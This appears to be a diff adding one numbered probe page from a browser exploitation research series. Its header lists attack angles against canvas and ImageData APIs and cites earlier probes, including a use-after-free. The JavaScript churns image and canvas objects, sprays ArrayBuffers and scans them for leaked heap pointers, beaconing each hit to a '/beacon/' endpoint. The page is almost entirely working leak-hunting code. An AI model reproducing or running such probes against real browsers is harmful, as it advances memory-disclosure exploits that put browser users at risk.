@@ -1,0 +1,416 @@
+<!--
+  p780: ImageData / OffscreenCanvas / createImageBitmap / CanvasPattern residue
+
+  ImageData objects wrap a C++ ImageData backing with a Uint8ClampedArray
+  for pixel storage. The backing holds width, height, colorSpace metadata
+  and a reference to the data buffer. Creating and discarding many
+  ImageData objects exercises the backing allocator.
+
+  OffscreenCanvas (if supported) creates a C++ OffscreenCanvas with its
+  own rendering context, separate from the DOM. Transferring via
+  transferControlToOffscreen() moves ownership of the rendering backend.
+
+  createImageBitmap() decodes image data into a C++ ImageBitmap with
+  GPU-backed or software pixel storage. The decode path allocates
+  intermediate buffers for format conversion, color space transform,
+  and resize operations.
+
+  CanvasPattern objects (ctx.createPattern()) hold a reference to the
+  source image/canvas and the repetition mode. The C++ Pattern object
+  contains the cached tile and transform state.
+
+  CanvasGradient objects (createLinearGradient/createRadialGradient)
+  hold a C++ Gradient with color stop arrays. Many stops means larger
+  internal arrays.
+
+  Attack angles:
+  A) Bulk ImageData create with varied sizes then GC + spray.
+  B) OffscreenCanvas context create/transfer/discard churn.
+  C) createImageBitmap from canvas with resize options.
+  D) CanvasPattern create/discard with varied sources.
+  E) CanvasGradient with many color stops then discard.
+  F) putImageData/getImageData pixel buffer transfer residue.
+
+  CRASH_CLASS: LOW (canvas/image APIs, no side effects)
+  prior art: p770 (ImageBitmap), p629 (Canvas2D struct), p635 (Canvas2D UAF)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p780</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+
+window.onload=function(){
+b('p780-START');
+
+// === Section A: Bulk ImageData create with varied sizes ===
+try{
+  b('A-imagedata');
+  var aHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var images=[];
+      var sizes=[[8,8],[16,16],[32,32],[10,20],[24,12],[48,48],[64,64],[100,50]];
+      for(var si=0;si<sizes.length;si++){
+        for(var i=0;i<20;i++){
+          var w=sizes[si][0];
+          var h=sizes[si][1];
+          var id=new ImageData(w,h);
+          for(var p=0;p<id.data.length;p+=4){
+            id.data[p]=round*30+i;
+            id.data[p+1]=si*20;
+            id.data[p+2]=p&0xFF;
+            id.data[p+3]=255;
+          }
+          images.push(id);
+        }
+      }
+
+      if(round===0)b('A created '+images.length+' ImageData objects, sizes='+sizes.length);
+      images=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[32,48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('A-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      aHits+=szHits;
+    }
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: OffscreenCanvas context churn ===
+try{
+  b('B-offscreencanvas');
+  var bHits=0;
+  var osSupported=typeof OffscreenCanvas!=='undefined';
+
+  if(!osSupported){
+    b('B-SKIP no OffscreenCanvas, trying transferControlToOffscreen');
+    var testCanvas=document.createElement('canvas');
+    if(testCanvas.transferControlToOffscreen){
+      osSupported=true;
+      b('B transferControlToOffscreen available');
+    }
+  }
+
+  if(!osSupported){
+    b('B-SKIP completely');
+  }else{
+    for(var round=0;round<3;round++){
+      (function(){
+        var canvases=[];
+        for(var i=0;i<30;i++){
+          try{
+            var oc;
+            if(typeof OffscreenCanvas!=='undefined'){
+              oc=new OffscreenCanvas(64+i*2,64+i*2);
+            }else{
+              var c=document.createElement('canvas');
+              c.width=64+i*2;
+              c.height=64+i*2;
+              oc=c.transferControlToOffscreen();
+            }
+            var ctx=oc.getContext('2d');
+            if(ctx){
+              ctx.fillStyle='rgb('+(round*50)+','+(i*5)+',100)';
+              ctx.fillRect(0,0,oc.width,oc.height);
+              ctx.strokeStyle='blue';
+              for(var j=0;j<10;j++){
+                ctx.strokeRect(j*5,j*5,oc.width-j*10,oc.height-j*10);
+              }
+            }
+            canvases.push(oc);
+          }catch(e){
+            if(i===0&&round===0)b('B oc_err='+e.message);
+          }
+        }
+
+        if(round===0)b('B created '+canvases.length+' offscreen canvases');
+        canvases=null;
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(96);}
+
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(128);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=128;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('B-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      bHits+=szHits;
+    }
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: createImageBitmap from canvas with resize ===
+try{
+  b('C-createimagebitmap');
+  var cHits=0;
+
+  var srcCanvas=document.createElement('canvas');
+  srcCanvas.width=128;srcCanvas.height=128;
+  var srcCtx=srcCanvas.getContext('2d');
+  for(var y=0;y<128;y++){
+    for(var x=0;x<128;x+=8){
+      srcCtx.fillStyle='rgb('+(x*2)+','+(y*2)+',128)';
+      srcCtx.fillRect(x,y,8,1);
+    }
+  }
+
+  var cibSupported=typeof createImageBitmap!=='undefined';
+  if(!cibSupported){
+    b('C-SKIP no createImageBitmap');
+  }else{
+    for(var round=0;round<3;round++){
+      var promises=[];
+      for(var i=0;i<30;i++){
+        try{
+          var opts={resizeWidth:16+i*4,resizeHeight:16+i*4,resizeQuality:'medium'};
+          var p=createImageBitmap(srcCanvas,0,0,128,128,opts);
+          promises.push(p);
+        }catch(e){
+          try{
+            var p2=createImageBitmap(srcCanvas);
+            promises.push(p2);
+          }catch(e2){
+            if(i===0&&round===0)b('C cib_err='+e2.message);
+          }
+        }
+      }
+
+      if(round===0)b('C queued '+promises.length+' createImageBitmap calls');
+
+      try{
+        var allSettled=Promise.all?Promise.all(promises):null;
+      }catch(e){}
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+      var SIZES=[48,64,96,128];
+      for(var si=0;si<SIZES.length;si++){
+        var sz=SIZES[si];
+        var szHits=0;
+        for(var i=0;i<200;i++){
+          var ab=new ArrayBuffer(sz);
+          var dv=new DataView(ab);
+          for(var off=0;off+8<=sz;off+=8){
+            if(isPtr(dv,off)){
+              szHits++;
+              if(szHits<=2)b('C-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+            }
+          }
+        }
+        cHits+=szHits;
+      }
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: CanvasPattern create/discard ===
+try{
+  b('D-pattern');
+  var dHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var canvas=document.createElement('canvas');
+      canvas.width=200;canvas.height=200;
+      var ctx=canvas.getContext('2d');
+
+      var patternSources=[];
+      for(var i=0;i<20;i++){
+        var pc=document.createElement('canvas');
+        pc.width=8+i*2;pc.height=8+i*2;
+        var pctx=pc.getContext('2d');
+        pctx.fillStyle='rgb('+(i*12)+','+(round*40)+',200)';
+        pctx.fillRect(0,0,pc.width,pc.height);
+        pctx.fillStyle='white';
+        pctx.fillRect(0,0,pc.width/2,pc.height/2);
+        patternSources.push(pc);
+      }
+
+      var patterns=[];
+      var repeats=['repeat','repeat-x','repeat-y','no-repeat'];
+      for(var i=0;i<patternSources.length;i++){
+        for(var ri=0;ri<repeats.length;ri++){
+          var pat=ctx.createPattern(patternSources[i],repeats[ri]);
+          if(pat)patterns.push(pat);
+        }
+      }
+
+      if(round===0)b('D created '+patterns.length+' patterns from '+patternSources.length+' sources');
+
+      for(var i=0;i<patterns.length;i++){
+        ctx.fillStyle=patterns[i];
+        ctx.fillRect(0,0,200,200);
+      }
+
+      patterns=null;
+      patternSources=null;
+      canvas=null;ctx=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(96);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=96;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('D-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    dHits+=szHits;
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: CanvasGradient with many color stops ===
+try{
+  b('E-gradient');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var canvas=document.createElement('canvas');
+      canvas.width=300;canvas.height=300;
+      var ctx=canvas.getContext('2d');
+
+      var gradients=[];
+      for(var i=0;i<30;i++){
+        var lg=ctx.createLinearGradient(0,0,300,300);
+        for(var s=0;s<=20;s++){
+          lg.addColorStop(s/20,'rgb('+(s*12)+','+(i*8)+','+(round*40)+')');
+        }
+        gradients.push(lg);
+
+        var rg=ctx.createRadialGradient(150,150,10+i,150,150,150);
+        for(var s=0;s<=15;s++){
+          rg.addColorStop(s/15,'rgba('+(round*30)+','+(s*15)+','+(i*6)+','+(0.5+s*0.03)+')');
+        }
+        gradients.push(rg);
+      }
+
+      if(round===0)b('E created '+gradients.length+' gradients (linear+radial)');
+
+      for(var i=0;i<gradients.length;i++){
+        ctx.fillStyle=gradients[i];
+        ctx.fillRect(0,0,300,300);
+      }
+
+      gradients=null;canvas=null;ctx=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var SIZES=[48,64,96,128];
+    for(var si=0;si<SIZES.length;si++){
+      var sz=SIZES[si];
+      var szHits=0;
+      for(var i=0;i<200;i++){
+        var ab=new ArrayBuffer(sz);
+        var dv=new DataView(ab);
+        for(var off=0;off+8<=sz;off+=8){
+          if(isPtr(dv,off)){
+            szHits++;
+            if(szHits<=2)b('E-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+          }
+        }
+      }
+      eHits+=szHits;
+    }
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: putImageData/getImageData pixel transfer ===
+try{
+  b('F-pixel-transfer');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var canvas=document.createElement('canvas');
+      canvas.width=128;canvas.height=128;
+      var ctx=canvas.getContext('2d');
+
+      ctx.fillStyle='rgb('+(round*50)+',100,200)';
+      ctx.fillRect(0,0,128,128);
+
+      var imageDataObjs=[];
+      for(var i=0;i<20;i++){
+        var w=16+i*4;var h=16+i*4;
+        var id=ctx.createImageData(w,h);
+        for(var p=0;p<id.data.length;p+=4){
+          id.data[p]=i*10;id.data[p+1]=round*30;
+          id.data[p+2]=p&0xFF;id.data[p+3]=255;
+        }
+        ctx.putImageData(id,i*2,i*2);
+        imageDataObjs.push(id);
+      }
+
+      for(var i=0;i<20;i++){
+        var got=ctx.getImageData(i*5,i*5,32,32);
+        imageDataObjs.push(got);
+      }
+
+      if(round===0)b('F put+get '+imageDataObjs.length+' ImageData objects');
+      imageDataObjs=null;canvas=null;ctx=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+
+    var szHits=0;
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(96);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=96;off+=8){
+        if(isPtr(dv,off)){
+          szHits++;
+          if(szHits<=2)b('F-PTR round='+round+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+    fHits+=szHits;
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p780-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
